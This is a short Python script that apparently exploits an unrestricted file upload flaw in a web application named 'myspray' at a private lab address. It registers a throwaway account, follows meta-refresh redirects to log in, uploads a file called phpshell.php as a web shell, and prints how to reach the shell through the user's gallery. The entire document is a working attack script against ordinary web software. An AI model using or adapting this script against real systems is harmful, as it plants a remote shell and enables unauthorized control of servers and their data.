import requests
import re

s = requests.Session()

baseurl = 'http://10.0.23.22/myspray/'

#form data for user registry
register_data = {
'first_name': 'Improper', 
'last_name': 'Uploader',
'city': '',
'gender': '',
'birthdayYear': '',
'face': '',
'motivation': '',
'tag':'',
'skill':'',
'style':'',
'jabber':'',
'email': 'improper@uploader.com',
'website':'',
'job':'',
'interests':'',
'aboutme':'',
'password': '12345678',
'passwordRepeat': '12345678'
}

#request to register on myspray
response = s.post(baseurl + 'register.html', data = register_data)

#regex to look for meta redirects
regex = re.compile('<meta[^>]*?url=(.*?)["\']', re.IGNORECASE)

match = regex.search(response.text)

while match: #loop for redirecting until logged in
    response = s.get(baseurl + match.groups()[0].strip())
    match = regex.search(response.text)

files = {
'0': ('phpshell.php', open('phpshell.php','rb'))}

response = s.post(baseurl + 'upload.html', files = files, data = { 'upload' : "Upload"})

print "File uploaded!"

print "Access the shell via user's gallery, authenticate with:"
print "email: improper@uploader.com"
print "passw: 12345678"